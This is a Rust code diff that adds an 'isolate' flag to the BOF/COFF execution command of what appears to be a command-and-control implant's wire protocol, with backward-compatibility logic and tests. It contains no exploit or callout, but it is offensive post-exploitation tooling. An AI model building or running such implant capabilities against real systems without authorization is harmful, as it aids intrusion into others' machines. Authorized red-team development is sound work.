@@ -151,10 +151,19 @@ pub enum Command {
     Exit,
     /// Execute a COFF/BOF object: `name` is a short entry label, `args` are
     /// string arguments, `blob` is the raw COFF bytes.
+    /// `isolate` (B3, v0.4.0): run the BOF in a sacrificial child process
+    /// (bof-host) instead of inline in the beacon. Wire format: a single
+    /// OPTIONAL trailing flag byte after `blob` — old encoders stop after
+    /// `blob` and the decoder defaults to `false` (inline); old decoders
+    /// reading a new-style frame leave the flag byte unread, which is safe
+    /// because Bof tasks are dispatched one per batch in practice (and a
+    /// Bof carrying `isolate` MUST be the last task in its batch). Both
+    /// mixed-version combinations therefore degrade to inline execution.
     Bof {
         name: String,
         args: Vec<String>,
         blob: Vec<u8>,
+        isolate: bool,
     },
     /// Open an outbound connection from the implant (TCP for P2P / rportfwd).
     /// `proto` 0 = TCP; `chan` is a server-assigned channel id.
@@ -333,7 +342,12 @@ impl Command {
                 w.str(path)?;
             }
             Command::Exit => w.u8(6),
-            Command::Bof { name, args, blob } => {
+            Command::Bof {
+                name,
+                args,
+                blob,
+                isolate,
+            } => {
                 w.u8(7);
                 w.str(name)?;
                 w.u32(args.len().min(MAX_WIRE_COUNT) as u32);
@@ -341,6 +355,9 @@ impl Command {
                     w.str(a)?;
                 }
                 w.blob(blob)?;
+                // B3: trailing optional flag byte (see the variant doc). Always
+                // written by new encoders; old decoders leave it unread.
+                w.u8(*isolate as u8);
             }
             Command::Connect {
                 proto,
@@ -485,7 +502,24 @@ impl Command {
                     args.push(checked_str(r, 4096)?);
                 }
                 let blob = r.blob()?.to_vec();
-                Command::Bof { name, args, blob }
+                // B3 backward-compat: the trailing isolate flag byte is
+                // optional — old encoders stop after `blob`, so only read it
+                // when bytes remain (mirrors SessionInfo::auth_token).
+                let isolate = if r.remaining() > 0 {
+                    match r.u8()? {
+                        0 => false,
+                        1 => true,
+                        v => return Err(WireError::BadTag(v)),
+                    }
+                } else {
+                    false
+                };
+                Command::Bof {
+                    name,
+                    args,
+                    blob,
+                    isolate,
+                }
             }
             8 => Command::Connect {
                 proto: r.u8()?,
@@ -1027,5 +1061,113 @@ mod tests {
                 shellcode: vec![0x90, 0xC3],
             }
         );
+    }
+
+    // ---- B3: Command::Bof.isolate wire-compat (new/old combinations) ----
+
+    /// Hand-encode a Bof command the way a pre-B3 (old) encoder did: tag 7 +
+    /// name + args + blob, NO trailing isolate byte.
+    fn encode_bof_legacy(name: &str, args: &[&str], blob: &[u8]) -> Vec<u8> {
+        let mut w = Writer::new();
+        w.u8(7);
+        w.str(name).unwrap();
+        w.u32(args.len() as u32);
+        for a in args {
+            w.str(a).unwrap();
+        }
+        w.blob(blob).unwrap();
+        w.into_bytes()
+    }
+
+    /// Decode a Bof command the way a pre-B3 (old) decoder did: read
+    /// name/args/blob and stop (the trailing isolate byte stays unread).
+    fn decode_bof_legacy(r: &mut Reader) -> (String, Vec<String>, Vec<u8>) {
+        assert_eq!(r.u8().unwrap(), 7);
+        let name = {
+            let b = r.blob().unwrap();
+            String::from_utf8(b.to_vec()).unwrap()
+        };
+        let n = r.u32().unwrap() as usize;
+        let mut args = Vec::with_capacity(n.min(256));
+        for _ in 0..n.min(256) {
+            let b = r.blob().unwrap();
+            args.push(String::from_utf8(b.to_vec()).unwrap());
+        }
+        let blob = r.blob().unwrap().to_vec();
+        (name, args, blob)
+    }
+
+    #[test]
+    fn bof_isolate_roundtrips() {
+        // New encoder → new decoder, both flag values.
+        let inline = Command::Bof {
+            name: "go".into(),
+            args: vec!["a".into()],
+            blob: vec![1, 2, 3],
+            isolate: false,
+        };
+        assert_eq!(round_trip(inline.clone()), inline);
+        let isolated = Command::Bof {
+            name: "go".into(),
+            args: vec!["a".into()],
+            blob: vec![1, 2, 3],
+            isolate: true,
+        };
+        assert_eq!(round_trip(isolated.clone()), isolated);
+    }
+
+    #[test]
+    fn bof_legacy_wire_decodes_as_inline() {
+        // Old server → new implant: no trailing byte, decode defaults to
+        // isolate=false (inline execution).
+        let bytes = encode_bof_legacy("go", &["x", "y"], &[0xde, 0xad]);
+        let mut r = Reader::new(&bytes);
+        let cmd = Command::decode(&mut r).expect("legacy Bof wire must decode");
+        assert_eq!(
+            cmd,
+            Command::Bof {
+                name: "go".into(),
+                args: vec!["x".into(), "y".into()],
+                blob: vec![0xde, 0xad],
+                isolate: false,
+            }
+        );
+        assert_eq!(r.remaining(), 0);
+    }
+
+    #[test]
+    fn bof_new_wire_legacy_decoder_reads_payload() {
+        // New server → old implant: the old decoder stops after `blob` and
+        // leaves the isolate byte unread — safe because a Bof carrying
+        // `isolate` is the last (only) task in its batch. The old implant
+        // therefore executes inline (it has no isolate concept).
+        let isolated = Command::Bof {
+            name: "go".into(),
+            args: vec!["a".into()],
+            blob: vec![9],
+            isolate: true,
+        };
+        let mut w = Writer::new();
+        isolated.encode(&mut w).unwrap();
+        let bytes = w.into_bytes();
+        let mut r = Reader::new(&bytes);
+        let (name, args, blob) = decode_bof_legacy(&mut r);
+        assert_eq!((name.as_str(), args.len(), blob.as_slice()), ("go", 1, &[9u8][..]));
+        // Exactly one trailing byte remains: the isolate flag (1).
+        assert_eq!(r.remaining(), 1);
+        assert_eq!(r.u8().unwrap(), 1);
+    }
+
+    #[test]
+    fn bof_isolate_rejects_bogus_flag_byte() {
+        // A trailing byte other than 0/1 is malformed (mirrors the
+        // SessionInfo::auth_token presence-byte rule).
+        let mut bytes = encode_bof_legacy("go", &[], &[1]);
+        bytes.push(2);
+        let mut r = Reader::new(&bytes);
+        assert!(matches!(
+            Command::decode(&mut r),
+            Err(WireError::BadTag(2))
+        ));
     }
 }
